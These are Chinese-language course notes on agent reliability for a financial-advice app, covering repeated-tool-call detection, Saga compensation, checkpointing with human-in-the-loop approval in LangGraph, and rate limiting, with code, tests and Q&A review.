## 第 1 步 · 总览：agent 会以哪些方式出错

> 🔁 **回顾**：FinWise agent 循环在 `chat_service.handle_user_message`，`for _step in range(MAX_AGENT_STEPS)`，上限 5（`chat_service.py:93`），超过返回 `max_steps`。阶段七 R1：`_call_llm_with_retry` 只重试暂时性错误。L03 第 6 步：重试分类、**超时 ≠ 没执行** → 幂等键、熔断器、降级链。LangGraph `recursion_limit` 与 `MAX_AGENT_STEPS` 同一作用。

普通程序出错多是"某一步抛异常"；agent 多出几种，因为**下一步是模型决定的**：

| # | 出错方式 | 例子 | 已学防护 | 本课新增 |
|---|---|---|---|---|
| ① | **停不下来** | 同参数反复调 `search_products`；两个工具间来回跳 | `MAX_AGENT_STEPS`、`recursion_limit` | **重复调用检测**、token 预算（第 2、3 步） |
| ② | **某一步失败** | LLM 429、MCP server 挂 | 重试分类 + 退避、熔断、降级链 | **带上次错误重试**、重试降级（第 2 步） |
| ③ | **做到一半失败** | 下单成功、扣款失败 → "有单没钱" | 幂等键（只解决重复执行） | **Saga 补偿**（第 4 步） |
| ④ | **进程挂了 / 要等人** | 部署重启任务丢失；大额操作等审批 | FinWise 会话落库（部分） | **持久化 + 断点恢复 + HITL**（第 5 步） |
| ⑤ | **请求太多** | 100 人同时评估打爆 LLM 限额 | 无 | **Semaphore、RateLimiter、超时**（第 6 步） |
| ⑥ | **被人利用** | 工具返回网页里藏恶意指令 | L03 安全、阶段七 S2 | **Q35** 执行代码 / 访问 URL（第 8 步） |

- **HITL**：Human-in-the-loop（人在回路中），关键节点停下等人确认。**QPS**：Queries Per Second（每秒请求数），RateLimiter 控制它。
- 第 ③ 行与第 7 步后端系统设计题是**同一套思想**：幂等、原子状态变更、补偿。

### 💬 课堂问答

> 🙋 **问**：已有 `MAX_AGENT_STEPS = 5`。模型每步都用相同参数调 `search_products`：1）能挡住吗？2）挡住前付出什么代价？用户看到什么？  
> 🧑 **我的回答**：不能挡住，MAX_AGENT_STEPS只限定最多调用次数，管不了每一轮调用是否正确  
> 🤖 **点评**：后半句说中关键——**只管次数、不判断每次是否合理**。⚠️ 但第 1 问答案是"**能挡住**"："挡住"= 最终能停（5 次后走到 `chat_service.py:459` 兜底，一定停）；你说的是**停得太晚**（第 2 次起就是无用功）。→ `MAX_AGENT_STEPS` 是**最后一道保险**。  
> 🧑 **我的回答（第 2 问）**：首先是结果不对，其次，浪费了token  
> 🤖 **点评**：✅ 具体化：  
> ➕ token **越来越贵**：每次带完整历史 + 前面 k−1 次 tool_use / tool_result（🔁 L04 第 6 步），第 2 步起全白付；  
> ➕ 用户**干等**：5 次 LLM 串行，每次 TTFT + 输出（🔁 L04 第 5 步），十几秒；  
> ➕ 结果**最差**：`{"code": "max_steps", "message": "agent 未能在限定步数内完成"}`，等了半天什么都没拿到；同样的 DB 查询执行 5 次。  
> ➕ 更好：第 2 次相同调用就发现 → 不执行、告诉模型"刚做过、结果是……，换做法"（给自我纠正机会），或提前结束返回明确错误 → 第 2 步。

### 📌 要记住的（第 1 步）
> agent 出错方式：停不下来、某步失败、做到一半失败、进程挂了 / 等人、请求太多、被利用。`MAX_AGENT_STEPS` 是最后一道保险：**保证能停但停得晚**，停下前 token 和时间白花、用户只拿到错误 → 需要更早更聪明的检测（重复调用检测）。

## 第 2 步 · 死循环防护进阶：预算、重复调用检测、带错误重试、重试降级

> 🔁 **回顾**：第 1 步 `MAX_AGENT_STEPS` 能停但停得晚。L03 第 7 步 7a：工具指纹先**规范化 JSON**（`json.dumps(..., sort_keys=True)`）再哈希。L04 第 6 步：不加 `sort_keys` 是缓存"隐形失效"之一。06 体检 C2：缺单会话 / 单用户 token 预算（只记录了设计）。

### 2.1 预算：三个维度限制总量

| 维度 | 限制什么 | FinWise 现状 |
|---|---|---|
| **步数** | 一轮最多几次 LLM / 工具调用 | ✅ `MAX_AGENT_STEPS = 5` |
| **token** | 一轮 / 一个会话 / 一个用户每天的 token | ❌ 06 体检 C2 只记了设计 |
| **时间** | 一轮最多跑多久（截止时间） | 部分：阶段七 L1 每次 LLM 调用有超时，**无整轮总时限** |
- 互补：步数没超 token 可能超（每步塞大段工具结果）；都没超时间可能超（工具每次快超时才返回）。
- token 统计：累加每次 `usage.input_tokens` + `usage.output_tokens`（开缓存还要加 `cache_read_input_tokens` / `cache_creation_input_tokens`，🔁 L04 Q37）。

### 2.2 重复调用检测：尽早发现原地打转

```
调用指纹 = 哈希(工具名 + 规范化后的参数)
计数表：{指纹: 已调用次数}；执行工具前查表，达到阈值就不执行、改为处理重复
```

| 类型 | 例子 | 识别 |
|---|---|---|
| **完全重复** | 连续 `search(养老, R2)` | 指纹计数 |
| **来回横跳** | search(养老) → detail(P1) → search(养老) → detail(P1) | 指纹计数（同一调用出现多次即算，不要求连续） |
| **换汤不换药** | `"养老"` vs `"养老 "` | 指纹前**规范化参数** |
| **没有进展** | 参数不同、结果每次都一样 | 进阶：对**结果**也算指纹 |

| 处理 | 做法 | 优点 | 缺点 |
|---|---|---|---|
| **A. 回喂提示** | 不执行，返回 `tool_result`（`is_error: true`）："已用相同参数调用过，结果在上文，请换做法或直接回答" | 给模型**自我纠正**机会，用户可能照样拿到结果 | 多一轮 LLM；模型可能不听 |
| **B. 直接终止** | 返回明确错误结束本轮 | 简单、立刻止损 | 用户什么也拿不到 |
- 常见：**第 2 次用 A 提醒、第 3 次用 B 终止**；`MAX_AGENT_STEPS` 仍保留兜底。

### 2.3 带错误重试：把错误交给模型

> 🔁 L03 第 5 步：工具执行出错用 `result` + `isError: true` 交给模型自我纠正。

| | 盲目重试（阶段七 R1） | 带错误重试 |
|---|---|---|
| 谁重试 | **代码**（模型不知道） | **模型**（看到错误自己改） |
| 请求 | 和上次**一模一样** | **改过的**（换参数 / 换工具） |
| 适合 | **暂时性**：超时、429、5xx | **参数 / 语义**：`risk_level="R9"`、产品代码不存在 |
| 为什么 | 过一会儿可能就成功 | 同样请求发一百次也错，必须改 |
- 例：`get_product_detail(product_code="养老基金")` 传了名字 → 返回 `{"is_error": true, "content": "product_code 应为 REC-001 这样的代码，可以先用 search_products 查到代码"}` → 模型先去搜。
- ⚠️ 错误信息**具体可操作**（错在哪、怎么改），但**不外泄内部细节**（🔁 阶段七 S3）。

### 2.4 重试降级：换条路

```
主路径 → 换参数 / 缩小范围 → 换备用工具 → 确定性流程 → 转人工
```
- FinWise 现成的确定性降级目标（06 体检 R2）：LLM 挂了改走问卷评估，`risk_calculator` 不依赖模型就能打分定级。

### 💬 课堂问答

> 🙋 **问**：`search_products({"keyword": "养老", "risk_level": "R2"})` 和 `search_products({"risk_level": "R2", "keyword": "养老 "})`：1）业务上算重复吗？2）用 `str(tool_input)` 当计数键能识别吗？3）指纹前要做哪两种处理？  
> 🧑 **我的回答**：业务上算重复，参数一样，只是json里顺序不同，所以不能直接用字符串比较，要么转成业务对象，用对象是否equal比较，或者对json字段进行排序后再转成string比较  
> 🤖 **点评**：✅ 第 1、2 问对：`str(dict)` 按**插入顺序**输出，两次不同。  
> ➕ 转对象：Python dict 比较**本身不看顺序**，但 dict 不能当字典键 → 实际还是转字符串或 `frozenset`；排序转字符串：`json.dumps(tool_input, sort_keys=True, ensure_ascii=False)` 最常用，嵌套也排序（🔁 L03 工具指纹）。  
> ⚠️ 还漏了一处差异：`"养老"` vs `"养老 "`，键排好序字符串仍不等。  
> 🧑 **我的回答**："养老 "多了个空格，要先 strip 去掉首尾空格  
> 🤖 **点评**：✅ 两种处理：① **规范化值**、② **键排序**：  
> ```python  
> def call_fingerprint(name: str, tool_input: dict) -> str:  
>     normalized = {k: v.strip() if isinstance(v, str) else v for k, v in tool_input.items()}  
>     return name + ":" + json.dumps(normalized, sort_keys=True, ensure_ascii=False)  
> ```  
> ⚠️ **规范化要有分寸**：只合并意思确实相同的（首尾空格、全角半角 `unicodedata.normalize("NFKC", ...)`、不区分大小写的代码）；`"养老"` vs `"养老保险"` 不能合并。**不够 → 漏判，过头 → 误判**（正常调用被拦）；宁可保守，有 `MAX_AGENT_STEPS` 兜底。

### 📌 要记住的（第 2 步）
> **预算**三维：步数、token、时间，互补。**重复调用检测**：指纹 = 工具名 + 规范化参数（**值 strip、键排序**），计数表；第 2 次回喂提示让模型自我纠正、第 3 次终止；规范化有分寸防误判。**带错误重试**：参数 / 语义错误交给**模型**改了再试，暂时性错误**代码**原样重试；错误信息具体可操作但不外泄细节。**重试降级**：主路径 → 换参数 → 备用工具 → 确定性流程（FinWise `risk_calculator`）→ 转人工。

## 第 3 步 · 动手：FinWise `chat_service` 加重复调用检测

改正式业务代码 `backend/app/services/chat_service.py`，测试在 `tests/test_chat_service.py`（后端全部 199 个通过）。
- FinWise 真实工具：`search_products` 只有 `risk_level`（C1~C5）；`get_product_detail` 参数是 `product_codes` **列表**。

### 3a 指纹函数

```python
def call_fingerprint(name: str, tool_input: dict) -> str:
    # 1. 规范化：顶层字符串去首尾空格，其他类型原样保留
    normalized = {
        k: (v.strip() if isinstance(v, str) else v)
        for k, v in tool_input.items()
    }
    # 2. 键排序 + 3. 拼接
    serialized = json.dumps(normalized, sort_keys=True, ensure_ascii=False)
    return f"{name}:{serialized}"
```
测试：键顺序无关、strip、工具名 / 值不同则不同（`"养老"` ≠ `"养老保险"`）、列表原样保留。
- ➕ 边界：`["REC-001", "REC-002"]` 和 `["REC-002", "REC-001"]` 指纹不同。**不处理是对的**：通用函数不知道列表顺序有没有意义（如按优先级排），一律排序可能误判；漏判还有阈值和 `MAX_AGENT_STEPS` 兜底。

### 3b 接入 agent 循环

```python
REPEAT_HINT_AT = 2    # 第 2 次相同调用：不执行，回喂 is_error 提示
REPEAT_ABORT_AT = 3   # 第 3 次相同调用：终止本轮

repeat_counter: dict[str, int] = {}           # 每轮一份（handle_user_message 开头）
...
if is_executable_tool(tool_result.name):
    fp = call_fingerprint(tool_result.name, tool_result.input)
    count = repeat_counter.get(fp, 0) + 1
    repeat_counter[fp] = count
    if count >= REPEAT_ABORT_AT:
        yield {"event": "error", "data": {"code": "repeated_tool_call",
                                            "message": f"本轮重复调用同一工具 {REPEAT_ABORT_AT} 次，已终止"}}
        return
    messages.append({... tool_use ...})        # 只写一遍
    block = {"type": "tool_result", "tool_use_id": tool_result.id}
    if count >= REPEAT_HINT_AT:
        block["content"] = f"重复调用：已用相同参数调用过 {tool_result.name}，结果在上文，请换一种做法或直接回答。"
        block["is_error"] = True
    else:
        block["content"] = json.dumps(_execute_tool(...), ensure_ascii=False)
    messages.append({"role": "user", "content": [block]})
    continue
```

| 测试 | 验证 |
|---|---|
| `test_repeated_call_second_time_gets_hint_not_executed` | 第 2 次不执行、回喂 `is_error` 提示、仍按 id 配对，模型能正常收尾 |
| `test_repeated_call_third_time_aborts` | 第 3 次终止 `repeated_tool_call`，LLM 只调 3 次，不落库 |
| `test_repeated_call_detects_whitespace_variant` | `"C4"` / `" C4 "` 算重复 |
| `test_different_calls_are_not_repeats` | 参数 / 工具不同不算重复（防误判） |
| `test_repeat_counter_resets_per_turn` | 每轮一份，下一轮再查同参数不算重复 |
| `test_max_step_limit`（改） | 每步参数不同（C0、C1……），避开重复检测，**单独**验证 `MAX_AGENT_STEPS` |

### 💬 课堂问答

> 🙋 **问**：计数表放哪层？A 每轮一份（`handle_user_message` 开头新建）/ B 每个会话一份（跨轮累计）？  
> 🧑 **我的回答**：选 A，每轮一份，上一轮的工具调用不落库  
> 🤖 **点评**：✅ 且后果比"省事"更关键：上一轮 `search(C3)` 结果**不在**本轮 `messages` 里、模型看不到 → 按会话计数回喂"结果在上文"就是**说谎**，模型只能瞎编或卡住；用户改主意（C2 → C3）重新查询本就合理。  
> ➕ 通用原则：**防护规则要建立在模型实际能看到的信息上**，回喂的提示必须是真话，否则防护本身制造新错误。

> 🙋 **问**：已有 `test_max_step_limit` 每步都调 `search(C4)`，加检测后会怎样？怎么改才能继续验证 `MAX_AGENT_STEPS`？  
> 🧑 **我的回答**：第 3 次停下，返回 repeated_tool_call；改成每步参数不同  
> 🤖 **点评**：✅ 新功能会"抢先"拦下，旧测试就不再测它原本要测的东西 → 改用不同参数，让两道防护**各自**有测试覆盖。

> 🤖 **代码评审**（3b 初版，功能正确、199 全过）：  
> ⚠️ message 写"连续 3 次"不准：计数是本轮**总次数**，"来回横跳"不连续也会触发，排查会被误导；且 message 经 SSE 发给前端，改中性的"本轮重复调用同一工具 3 次，已终止"。  
> ➕ 两个分支的 tool_result 追加结构几乎相同 → 先算 `content` / `is_error` 再统一追加一次，以后加字段只改一处。（按此修改，测试不变、仍全过）

### 📌 要记住的（第 3 步）
> 指纹 = 工具名 + 规范化参数（strip + sort_keys），通用函数不擅自排序列表（宁可漏判不误判）。**计数范围 = 模型能看到的上下文**（FinWise 中间工具往返不落库 → 每轮一份），回喂提示必须是真话。第 2 次回喂 `is_error` 提示（仍按 id 配对）、第 3 次终止。新防护会让旧测试"测不到原本要测的东西" → 调整旧测试，让每道防护各有覆盖。

## 第 4 步 · 事务性：Saga 补偿

> 🔁 **回顾**：数据库事务要么全成功、要么全撤销（FinWise conclude 在**同一事务**里写 assessment + 更新 session）。L03 第 6 步幂等键只解决"同一操作执行两次"。第 1 步第 ③ 行："有单没钱"。

### 4.1 问题：多步不在同一事务里

```
"帮我把 10 万元配置成一个稳健组合"
  T1 冻结资金 10 万   ← 账户服务
  T2 买入产品 A 6 万  ← 交易服务
  T3 买入产品 B 4 万  ← 交易服务（另一产品方）
  T4 发短信通知客户    ← 短信服务
```
T3 失败时 T1、T2 **早已提交**，没有统一的回滚按钮。
- **2PC**（Two-Phase Commit，两阶段提交）：先让各方"准备好并锁资源"，都准备好再一起提交。不适合 agent：外部 API 一般**不支持**；资源要锁到最后，而 agent 每步夹着 LLM 调用、**一步好几秒**。

### 4.2 Saga：每步配一个补偿动作

**Saga**（1987 年论文，原意"长篇故事"，指多步骤、长时间的事务）：拆成**各自独立提交**的 T1…Tn，**每步配补偿** C1…Cn（业务上撤销），第 k 步失败时**倒序**补偿已成功的步骤。

| 步骤 | 正向 T | 补偿 C |
|---|---|---|
| 1 | 冻结资金 | 解冻资金 |
| 2 | 买入 A | 撤单 / 赎回 A |
| 3 | 买入 B | 撤单 / 赎回 B |
| 4 | 发短信通知 | ❓（见课堂问答） |

### 4.3 补偿 ≠ 回滚

| | 数据库回滚 | Saga 补偿 |
|---|---|---|
| 怎么撤销 | 当作**没发生过** | 再做一个**相反的业务动作** |
| 中间状态 | 别人看不到（隔离） | **能看到**（T2 提交到补偿前确有 A 持仓） |
| 会失败吗 | 数据库保证 | **补偿本身可能失败**（撤单时交易服务挂了） |
- 硬要求：① **补偿必须幂等**（失败要重试，可能执行多次）；② 补偿失败**一直重试**，多次失败进**人工处理队列**，不能悄悄放弃；③ 记录 **Saga 日志**（哪些步骤成功、补偿做到哪），进程挂了靠它继续（第 5 步）。

### 4.4 补偿由谁决定：代码，不是模型
- 注册工具时**正向 + 补偿配对注册**（`place_order` ↔ `cancel_order`）；出错由编排代码**确定性地**倒序执行。
- 🔁 L03 Q34"关键值去模型化"：有财务后果的路径由代码掌控（模型可能忘补偿、撤错单）。

### 💬 课堂问答

> 🙋 **问**：T3（买入 B）失败：1）执行哪些补偿、什么顺序、为什么？2）短信发出去收不回，怎么处理？（提示：放在什么位置）  
> 🧑 **我的回答**：倒序补偿：先撤单 A 再解冻资金；短信放最后发 - 确认所有前置操作都成功后  
> 🤖 **点评**：✅ 两问都对。补充：  
> ➕ **为什么倒序**：后面依赖前面（买 A 用的是 T1 冻结的钱），先解冻会失败或账目不平 → 撤销顺序与执行顺序相反（脱衣服从最外层脱）。  
> ⚠️ **T3 自己要补偿吗**：明确失败不用；但若是**超时**（🔁 L03：超时 ≠ 没执行），产品方可能已下单 → **先查实际状态**（面试答案"非幂等任务先检查状态"），已成功就也补偿。  
> ➕ **排序原则**：`可补偿步骤 → 关键不可撤销步骤 → 可一直重试直到成功的步骤（通知）`——能撤销的在前，撤不了的在最后（执行到这时前面都已成功），通知失败一直重试即可。实在放不到最后（中途必须先通知）→ 只能做**纠正动作**（再发"上一条作废"）——补偿是业务撤销，不能让事情没发生过。

### 📌 要记住的（第 4 步）
> 跨系统多步无统一事务；2PC 长时间锁资源、外部 API 不支持 → 不适合 agent。**Saga**：每步独立提交 + **配补偿**，失败**倒序**补偿已成功步骤（后面依赖前面）。补偿 ≠ 回滚：中间状态可见、补偿会失败 → **幂等**、一直重试、转**人工**、记 **Saga 日志**。失败步骤若**超时**先查状态。**可撤销在前、不可撤销在最后**，否则只能纠正。补偿由**代码**配对注册、确定性执行，不交给模型。

## 第 5 步 · 状态持久化、断点恢复与 Human-in-the-loop

> 🔁 **回顾**：第 4 步 Saga 要记日志。FinWise：会话和消息落库，但一轮里的工具往返**只在内存**，且"user 消息只在 LLM 成功响应后才写入"。LangGraph 笔记只提过"暂停等人确认、靠 checkpoint 存档"。

### 5.1 状态持久化：每走一步存一次档

执行状态（messages、第几步、Saga 日志）默认在**进程内存**，部署重启 / 宕机 / 内存溢出就全丢 → 每完成一步写进数据库，存档点叫 **checkpoint**（检查点，≈ 游戏存档）。
- **FinWise 现在不太需要**：工具全**只读**，中途挂掉无副作用；user 消息成功后才落库，挂了**重发**即可。
- **必须做的时候**：工具**有副作用**（第 4 步下单）——挂了要知道"A 已买、B 未买"才能决定继续还是补偿，否则重复买入或有单没钱。

### 5.2 断点恢复：从最后一个存档点接着跑

```
重启 → 读最后一个 checkpoint → 从下一步接着执行
T2 买入 A ✅ → 💥 挂了（checkpoint 还没写）→ 恢复：从 T2 开始 → 又买一次 A ❌
```
- 断点恢复只能保证**至少执行一次**，做不到恰好一次 → 每步必须**幂等**（🔁 L03 幂等键：同一个键再下单，服务端返回之前那笔）。
```
至少执行一次 + 幂等 = 效果上恰好执行一次      ← 第 7 步"分布式任务只执行一次"的核心
```

### 5.3 Human-in-the-loop：故意暂停等审批

高风险动作（大额买入、改风险等级）停下等人确认。难点：可能等**几分钟到几天**，进程和 HTTP 连接都撑不住。解法和断点恢复一样：
```
到高风险动作 → 存 checkpoint → 结束当前执行（故意"挂掉"）
……人审批（可能隔几天）……
收到结果 → 读 checkpoint → 带着审批结果继续
```
→ **暂停 = 有计划的挂掉，恢复 = 断点恢复**，所以 LangGraph 用同一套机制。

```python
from langgraph.checkpoint.memory import InMemorySaver   # 生产换 PostgresSaver 等落库实现
from langgraph.types import interrupt, Command

def buy_node(state):
    approved = interrupt({"action": "buy", "product": "A", "amount": 60000})  # ① 暂停
    if approved:
        place_order(...)

graph = builder.compile(checkpointer=InMemorySaver())
config = {"configurable": {"thread_id": "order-123"}}   # thread_id 区分是哪个任务的存档
graph.invoke(inputs, config)                 # 跑到 interrupt 暂停、存档
graph.invoke(Command(resume=True), config)   # ② 恢复：resume 的值成为 interrupt(...) 的返回值
```

| 审批设计要点 | 原因 |
|---|---|
| 展示**真实参数**（产品代码、金额），不是模型摘要 | 摘要可能与实际参数不一致（🔁 L03 关键值不信模型） |
| 审批**绑定这组参数**，参数变了重新审批 | 防止通过后参数被悄悄改 |
| **超时**按拒绝处理 | 任务不能无限挂着 |
| 审批人**不能是发起人或 agent** | 否则形同虚设 |

### 💬 课堂问答

> 🙋 **问**：恢复时**被中断的节点从头重新执行**（到 `interrupt` 处直接返回 resume 值）。下面节点恢复后会出什么问题？怎么改？  
> ```python  
> def buy_node(state):  
>     send_sms(state["phone"], "即将为您买入产品 A 6 万元，请等待审批")   # ①  
>     approved = interrupt({"action": "buy", "product": "A", "amount": 60000})  
>     if approved:  
>         place_order("A", 60000)  
> ```  
> 🧑 **我的回答**：短信会发两次；把发短信挪到 interrupt 之后  
> 🤖 **点评**：✅ 问题找对。⚠️ 挪到后面**改变了业务含义**（"请等待审批"变成审批后才发），只适合时机无所谓的场景。更通用的两种：  
> | 办法 | 做法 | 原理 |  
> |---|---|---|  
> | **A. 拆两个节点**（推荐） | `notify_node` 发短信 → `buy_node` interrupt + 下单 | LangGraph 在**每个节点执行完后**存档，恢复只重跑 `buy_node` |  
> | **B. 副作用幂等** | 带幂等键（`f"{thread_id}:notify"`）由短信服务去重 | 至少一次 + 幂等 = 恰好一次 |  
> ⚠️ B 的陷阱：**不能**在同一节点先往 state 写"已发送"再 interrupt——存档在节点**完成后**，中断的节点没完成，标记**不会保存** → 去重记录必须在**节点外部**（短信服务 / 单独的表）。  
> ➕ 通用规则：`interrupt` **之前**的代码要么无副作用、要么幂等；之后的 `place_order` 若执行完、节点没结束就挂了也会重跑 → 照样带幂等键。

### 追问 1：interrupt 怎么知道从哪个 checkpoint 继续？

> **❓ 我的追问**：buy_node函数里的interrupt调用，它是怎么知道从哪个checkpoint继续往下走的？  

**`interrupt` 自己不知道**，是 LangGraph **运行时**根据 `thread_id` 找到存档、把审批结果递给它。

**第一次调用**（`graph.invoke(inputs, {"configurable": {"thread_id": "order-123"}})`）：
1. 运行时按图执行，**每执行完一步以 `thread_id` 为标识存 checkpoint**（state 值 + "下一步执行哪个节点"）；
2. 执行到 `interrupt(...)`，它在内部**抛出特殊异常**（`GraphInterrupt`），`buy_node` 中断；
3. 运行时捕获，写进最新 checkpoint：下一步是 `buy_node`、它在等中断结果、附带数据 `{"action": "buy", ...}`；
4. `invoke` 返回，结果里带 `__interrupt__`（审批界面从这取参数）。此时进程里**没有任何东西在等**，全在 checkpoint 里。

**恢复**（`graph.invoke(Command(resume=True), 同一个 config)`）：
1. 用 `thread_id` 取**这个任务的最新 checkpoint** → "从哪个 checkpoint 继续"**由 `thread_id` 决定**，默认取最新；
2. 读到下一步是 `buy_node` 且在等中断结果；
3. 暂存 `resume=True`，**从头**重跑 `buy_node`（短信发两次的原因）；
4. 再执行到 `interrupt(...)` 时发现有暂存的 resume 值 → **不抛异常，直接返回 `True`** 给 `approved`。
```
第一次：buy_node 开头 → ① send_sms → interrupt() ──抛异常──▶ 运行时存档、返回
恢复：  buy_node 开头 → ① send_sms（又一次）→ interrupt() ──直接返回 True──▶ place_order
```
→ `interrupt` 像"检查点标记"：第一次负责停下，恢复后负责交出审批结果，靠运行时上下文判断处在哪种情况。
- ① **一个节点多个 interrupt 按调用顺序匹配** resume 值 → 不要用会变化的条件决定是否调用 interrupt，否则对错位置。
- ② 带 `checkpoint_id` 可从历史存档点重跑（"时间旅行"，调试 / 重走分支）；`graph.get_state(config)` 看 `.next` 和中断信息。
- （langgraph-lab 的 venv 是 Intel 版 Python 建的、arm64 上跑不起来，以上**未实际运行验证**。）

### 追问 2：thread_id 从哪来？

> **❓ 我的追问**：{"thread_id": "order-123"}，LangGraph是怎么知道每次调用用什么order id的？  

**LangGraph 不知道也不负责**：`thread_id` 完全由**你的代码**决定和保存，对 LangGraph 只是一个字符串标签。
```
① 用户发起买入
   后端：thread_id = f"order-{uuid4()}"                                   ← 你的代码生成
         INSERT approvals(approval_id, thread_id, 参数, status='pending')  ← 存进业务表
         graph.invoke(inputs, {"configurable": {"thread_id": thread_id}})  → 停在 interrupt
② 审批人打开待审批列表（从 approvals 表查）
③ 点"同意"：POST /approvals/{approval_id}/approve（前端只带业务 ID）
   后端：SELECT thread_id FROM approvals WHERE approval_id = ... → 校验权限
         graph.invoke(Command(resume=True), {"configurable": {"thread_id": thread_id}})
         UPDATE approvals SET status='approved'
```
🔁 FinWise 同样模式：前端带**会话 code**，后端 `find_session_by_code` 查出会话；`thread_id` 就是 LangGraph 里的"会话 code"。

| 规则 | 原因 |
|---|---|
| 每个任务**唯一** thread_id（UUID） | 共用会混状态：恢复 A 的审批却跑 B 的流程 |
| 任务结束**不复用** | 复用会接着旧存档跑 |
| **后端生成**，不让模型填、不让前端随便传 | 🔁 L03"作用于谁"的值不让模型填；前端能传就能恢复别人的任务（越权 IDOR） |
| 恢复前**校验权限** | 确认当前审批人有权审批这一条 |

### 📌 要记住的（第 5 步）
> **持久化**：每步存 checkpoint；FinWise 工具只读、挂了重发即可，**有副作用就必须存**。**断点恢复**只保证至少一次（执行完未存档就挂会重跑）→ **至少一次 + 幂等 = 恰好一次**。**HITL**：存档 → 结束 → 审批 → 恢复，**暂停 = 有计划的挂掉**（`checkpointer`、`thread_id`、`interrupt`、`Command(resume=...)`）；审批展示真实参数并绑定、超时即拒、审批人非发起人。**恢复时节点从头重跑**：interrupt 前的副作用拆到前一个节点或做幂等，去重记录放节点外部。  
> **checkpoint 以 `thread_id` 标识**：恢复时运行时取该任务最新存档，`interrupt` 第一次抛异常让运行时存档返回、恢复后重跑时直接返回 resume 值（多个按顺序匹配）。`thread_id` 由**后端生成**、存进业务表和业务 ID 对应，不复用、不让模型 / 前端指定，恢复前校验权限。

## 第 6 步 · 并发控制：Semaphore、RateLimiter、超时

> 🔁 **回顾**：L03 第 6 步：**429**（Too Many Requests）退避重试；**熔断器**在下游持续故障时快速失败。阶段七 L1：每次 LLM 调用加超时。L04 第 5 步：一次 LLM 调用好几秒。

### 6.1 为什么要控制

100 人同时评估、每轮多次 LLM → LLM API 有限额（每分钟请求数 / token 数，超了 429，大家同时重试又一起撞）、MCP server / 数据库承载有限、成本无上限 → **在自己这一侧主动限流**。重试、熔断是**被拒之后**的应对，限流是**事先**不超量。

### 6.2 并发数 vs QPS

| | 并发数 | QPS |
|---|---|---|
| 含义 | **同一时刻**还在路上的请求数 | **每秒**新发出的请求数 |
| 类比 | 餐厅**同时几桌**在吃 | 门口**每分钟进几桌** |
| 控制 | **Semaphore** | **RateLimiter** |

```
并发数 ≈ QPS × 平均耗时        （利特尔法则 Little's Law）
```
| 符号 | 含义 | 例子 |
|---|---|---|
| 并发数 | 同时在路上的请求数 | ? |
| QPS | 每秒发出的请求数 | 限额 5 / 秒 |
| 平均耗时 | 发出到返回 | LLM 4 秒 |
代入 5 × 4 = **20**：想用满限额要 20 个同时在路上；Semaphore 设 3 则 QPS 最多 3 ÷ 4 = 0.75 → **两个参数要配合设**。

### 6.3 三件工具

- **Semaphore（信号量）**：装 N 张通行证的盒子，进去拿、出来还，空了就排队。`async with sem:` 出块自动归还（抛异常也还）。
- **令牌桶**（Token Bucket，RateLimiter 最常用算法）：最多 `capacity` 个令牌、每秒补 `rate` 个，请求拿 1 个才能发；平时攒满 → 允许突发 `capacity` 个，长期每秒最多 `rate` 个。
```
当前令牌数 = min(capacity, 上次剩余 + rate × 距上次经过的秒数)
```
| 符号 | 含义 | 例子 |
|---|---|---|
| capacity | 桶容量 = 最大突发量 | 3 |
| rate | 每秒补充数 = 长期 QPS 上限 | 2 |
| 经过秒数 | 这次时间 − 上次补充时间 | 0.5 |
| min(…) | **最多只攒到 capacity** | 过 100 秒也只有 3 个 |
- **`asyncio.timeout`**（Python 3.11+）：到时抛 `TimeoutError` 并取消里面正在等的操作。

### 6.4 组合与注意点

```
令牌桶（QPS）→ Semaphore（并发数）→ timeout（单次耗时）→ 调用 → 429 / 超时 → 退避重试（🔁 L03）
```
- ⚠️ 退避等待时**别占着 Semaphore 通行证**，否则等重试的请求占满通行证、正常请求进不去。
- **限流与熔断互补**：限流"别把下游压垮"，熔断"下游已出问题别再压"。
- **多实例**：每个进程的 Semaphore / 令牌桶只管自己，4 个实例上限就是 4 倍 → 全局限流用 **Redis** 等共享存储。
- **按用户限流**：防一个人用光全局限额、防恶意刷（面试答案"用户维度限流"）。

### 动手：`backend/scratch/s6_03_concurrency_limits.py`（测试 8 个全过）

```python
# 6a 令牌桶
elapsed = now - self.last
self.tokens = min(self.capacity, self.tokens + self.rate * elapsed)
self.last = now
if self.tokens >= 1:
    self.tokens -= 1
    return True
return False

# 6b Semaphore
sem = asyncio.Semaphore(max_concurrency)
async def guarded(call):
    async with sem:
        return await call()
return list(await asyncio.gather(*(guarded(c) for c in calls)))

# 6c 超时
try:
    async with asyncio.timeout(seconds):
        return await call()
except TimeoutError:
    return "timeout"
```
```
最多 10 个并发：峰值 10 个，总耗时 0.20 秒
最多  3 个并发：峰值 3 个，总耗时 0.80 秒     ← 分 4 批（3+3+3+1）× 0.2
耗时 1.0 秒的调用 → timeout                    ← 到 0.3 秒就放弃
```
- 6a ➕ `now < self.last` 时 elapsed 为负会**扣令牌**；用 `time.time()` 遇时钟回拨就中招 → 真实实现用 **`time.monotonic()`**（单调时钟），或 `max(0, now - self.last)`。
- 6b ➕ **Semaphore 建在哪决定限制什么**：建在 `run_all` 里只限这一批；服务里每个请求各建一个 = 没限制 → 必须是**全局共享同一个对象**（模块级 / 启动时挂在 app 上，🔁 L03 共享 HTTP 客户端同理）。➕ `gather` 一个异常就立刻抛出、其他结果丢失（还在后台跑）→ 批量用 `return_exceptions=True`。
- 6c ➕ `asyncio.timeout` 只取消**你这侧的等待**，远程服务端可能还在处理（🔁 L03 超时 ≠ 没执行）→ 有副作用的调用超时后带幂等键重试或先查状态。

### 追问：空闲 10 秒，rate 会变成 50 吗？

> **❓ 我的追问**：关于令牌桶，你说"每秒往里补 rate 个"，那假设rate是5，然后10秒都没有请求进来，10秒后rate不是变成50了吗？  

两个量要分开：

| 量 | 含义 | 会不会变 |
|---|---|---|
| **rate** | 每秒**补充**几个（≈ 水龙头流速） | **不变**，一直 5 |
| **tokens** | 桶里**当前**有几个（≈ 桶里水量） | 补充增加、请求拿走减少，**最多到 capacity** |
rate = 5、capacity = 10、空闲 10 秒：`min(10, 0 + 5 × 10) = min(10, 50) = 10` → 多出来的**溢出**。
```
t=0~10 秒：无请求，攒到 10 个（满了，后面补的溢出）
t=10 秒：  来 30 个 → 前 10 个放行，20 个拒绝 / 排队
t=10~11 秒：补 5 个 → 每秒又能放 5 个；之后长期每秒最多 5 个
```
- **capacity 决定最大突发**、**rate 决定长期速度**。
- 没有上限的后果：空闲 1 小时攒 18000 个，下一波一次性全放行 → 压垮下游（正是限流要防的）。
